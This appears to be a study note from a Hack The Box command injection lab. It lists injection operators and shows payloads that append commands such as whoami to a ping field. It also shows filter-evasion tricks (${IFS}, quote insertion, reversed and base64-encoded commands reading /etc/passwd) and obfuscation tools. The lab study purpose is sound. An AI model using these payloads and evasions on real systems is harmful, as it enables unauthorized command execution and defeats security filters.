---
aliases:
---
# Command Injections

a web application written in `PHP` may use the `exec`, `system`, `shell_exec`, `passthru`, or `popen` functions to execute commands directly on the back-end server

if a web application is developed in `NodeJS`, a developer may use `child_process.exec` or `child_process.spawn` for the same purpose.

# Exploitation

## 1.Detection

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F4gkPwucgn1uY4eI3Iow2%2Fimage.png?alt=media&amp;token=d8e3495d-36d0-49aa-aa43-7d82c8f25511" alt=""><figcaption></figcaption></figure>

127.0.0.1

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fn4canfJZDH8wcwizJC3v%2Fimage.png?alt=media&amp;token=0c21d8e4-e627-4708-9a50-675ad99821d6" alt=""><figcaption></figcaption></figure>

## Command Injection Methods

```bash
ping -c 1 OUR_INPUT
```

> To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |

## 2.Injecting Commands

```bash
ping -c 1 127.0.0.1; whoami

ping -c 1 127.0.0.1; whoami # on terminal
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FebfNK9Xyju8EtNvUXi5J%2Fimage.png?alt=media&amp;token=463cfcb2-9b51-410b-a3f4-79f603ee11c5" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FH7jB74FwE9MQiolRPIg1%2Fimage.png?alt=media&amp;token=53bcf694-0e3e-4c58-bef4-79969d1fa446" alt=""><figcaption></figcaption></figure>

### Bypassing Front-End Validation

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FyZg0q51897qZhX5W3WJ5%2Fimage.png?alt=media&amp;token=fd13f151-16db-47c4-8a51-667239e81247" alt=""><figcaption></figcaption></figure>

127.0.0.1; whoami   `[CTRL + U](encode)`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F4uRX9tN3WNOeMBWAhAeV%2Fimage.png?alt=media&amp;token=cf448c02-fb8e-4c15-b843-53a04c945e2c" alt=""><figcaption></figcaption></figure>

## 3.Other Injection Operators

### AND operator

We can start with the `AND` (`&&`) operator

127.0.0.1 && whoami

```bash
ping -c 1 127.0.0.1 && whoami
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F7ObLEMyBNazgBpSO8vYt%2Fimage.png?alt=media&amp;token=85976401-32e2-49b1-9216-7cb3a3b55b75" alt=""><figcaption></figcaption></figure>

### OR Operator

127.0.0.1 || whoami

```shell-session
ping -c 1 127.0.0.1 || whoami
```

```shell-session
ping -c 1 || whoami
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FNcf9Xl7RyhGXwSdvpd3l%2Fimage.png?alt=media&amp;token=95cb976a-fb9f-4d63-8e08-5e422d70d76e" alt=""><figcaption></figcaption></figure>

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |



# Filter Evasion

## 1.Identifying Filters

## Filter/WAF Detection

```
;, &&, ||
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fv2tmPaoXjbX4tANchTy7%2Fimage.png?alt=media&amp;token=a9860723-f387-4b6c-9ddc-a4cfee03da02" alt=""><figcaption></figcaption></figure>

```bash
127.0.0.1; whoami
```

## Identifying Blacklisted Character

127.0.0.1;

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5DrlyO56ESDgEZrJ5m7j%2Fimage.png?alt=media&amp;token=daf561b9-932f-463c-8651-73ed06d73077" alt=""><figcaption></figcaption></figure>

## 2.Bypassing Space Filters

### Bypass Blacklisted Operators

### <br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FdV1K46whMNQlURXWmQWp%2Fimage.png?alt=media&amp;token=49a911a0-a655-4026-b772-7074b262e53b" alt=""><figcaption></figcaption></figure>

### Bypass Blacklisted Spaces

127.0.0.1%0a whoami

<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1KQ9uXBFWvZQxmBVQwzK%2Fimage.png?alt=media&amp;token=a70c2000-b8cc-4dad-bc00-dad6c33049ac" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FsFkFH2ndlHSP2mS1o5PL%2Fimage.png?alt=media&amp;token=3bc33080-9a1a-436d-8847-c36fc2d778a5" alt=""><figcaption></figcaption></figure>

### **Using Tabs**

Using tabs (%09) instead of spaces is a technique that may work

127.0.0.1%0a%09

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F3bStDyiYzXvZ5TPL6XEb%2Fimage.png?alt=media&amp;token=bbae5fa6-bf28-4227-b676-b2d528ebcfd3" alt=""><figcaption></figcaption></figure>

### **Using $IFS**

use ${IFS} and see if it works (127.0.0.1%0a${IFS}

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0PXoAiNWd5GlBs8U4oFY%2Fimage.png?alt=media&amp;token=745d657d-007f-4dba-a245-0897a9d71e31" alt=""><figcaption></figcaption></figure>

### **Using Brace Expansion**

```shell-session
{ls,-la}
127.0.0.1%0a{ls,-la}
```

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space>" %}

## 3.Bypassing Other Blacklisted Characters

### Linux

```shell-session
echo ${PATH}
```

```shell-session
echo ${PATH:0:1}
```

We can do the same with the `$HOME` or `$PWD` environment variables as well.

```shell-session
echo ${LS_COLORS:10:1}
```

```
127.0.0.1${LS_COLORS:10:1}${IFS}
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F4xjbJ696T3Fmu7KEJNjD%2Fimage.png?alt=media&amp;token=67347bcd-a906-4c5c-8922-b948b49821fe" alt=""><figcaption></figcaption></figure>

### Windows

```cmd-session
echo %HOMEPATH:~6,-11%
```

Windows PowerShell

```powershell-session
 $env:HOMEPATH[0]
  $env:PROGRAMFILES[10]
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need. `Try to be creative and find different commands to produce similar characters.`

### Character Shifting

```shell-session
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
```

## 4.Bypassing Blacklisted Commands

## Commands Blacklist

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FgZ7J7l9C9TQxhAl0gtem%2Fimage.png?alt=media&amp;token=434521fe-209a-4ecd-b6d0-a2462dca764f" alt=""><figcaption></figcaption></figure>

### Linux & Windows

single-quote ' and a double-quote "

```shell-session
w'h'o'am'i
w"h"o"am"i
127.0.0.1%0aw'h'o'am'i
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrMj9npVbb89RwATTIO4R%2Fimage.png?alt=media&amp;token=176c55e9-0698-4954-be19-0693b3000521" alt=""><figcaption></figcaption></figure>

### Linux Only

```bash
who$@ami
w\ho\am\i
```

### Windows Only

```cmd-session
 who^ami
```

## 5.Advanced Command Obfuscation

### Case Manipulation

```
 WhOaMi
```

However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word.

```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrWowMQSHMw53MUUpGijL%2Fimage.png?alt=media&amp;token=471ec77f-1d5d-46a4-b131-7e74d14b04e1" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FgJwZ0KsuZhuL8o7GIoq2%2Fimage.png?alt=media&amp;token=4b66a6c4-af47-4f6f-b146-faafcedd8354" alt=""><figcaption></figcaption></figure>

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

### Reversed Commands

```shell-session
 echo 'whoami' | rev
 
 imaohw
```

```shell-session
$(rev<<<'imaohw')
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FjUHbn18eRPchTjVygBOg%2Fimage.png?alt=media&amp;token=b0ff15c8-a074-4421-a519-305b64fb9cf2" alt=""><figcaption></figcaption></figure>

## Windows

```powershell-session
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands

```shell-session
echo -n 'cat /etc/passwd | grep 33' | base64
```

```shell-session
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

***

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FgXhLXyN3q39bFyXiebiB%2Fimage.png?alt=media&amp;token=ebd46dd4-696d-4fe0-9e34-6c24fc51b304" alt=""><figcaption></figcaption></figure>

Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.

We use the same technique with Windows as well. First, we need to base64 encode our string,

```powershell-session
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```shell-session
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

\
Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell-session
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

> <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion>

## 6.Evasion Tools

### Linux (Bashfuscator)

{% embed url="<https://github.com/Bashfuscator/Bashfuscator>" %}

```shell-session
Olanzapine@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
Olanzapine@htb[/htb]$ cd Bashfuscator
Olanzapine@htb[/htb]$ pip3 install setuptools==65
Olanzapine@htb[/htb]$ python3 setup.py install --user
```

```shell-session
Olanzapine@htb[/htb]$ cd ./bashfuscator/bin/
Olanzapine@htb[/htb]$ ./bashfuscator -h
```

```shell-session
./bashfuscator -c 'cat /etc/passwd'
```

However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:

```shell-session
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

We can now test the outputted command with `bash -c ''`

```shell-session
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

### Windows (DOSfuscation)

{% embed url="<https://github.com/danielbohannon/Invoke-DOSfuscation>" %}

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help
```

```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

\
Finally, we can try running the obfuscated command on `CMD`, and we see that it indeed works as expected:

```cmd-session
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

> Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. This tool is installed by default in your \`Pwnbox\` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).
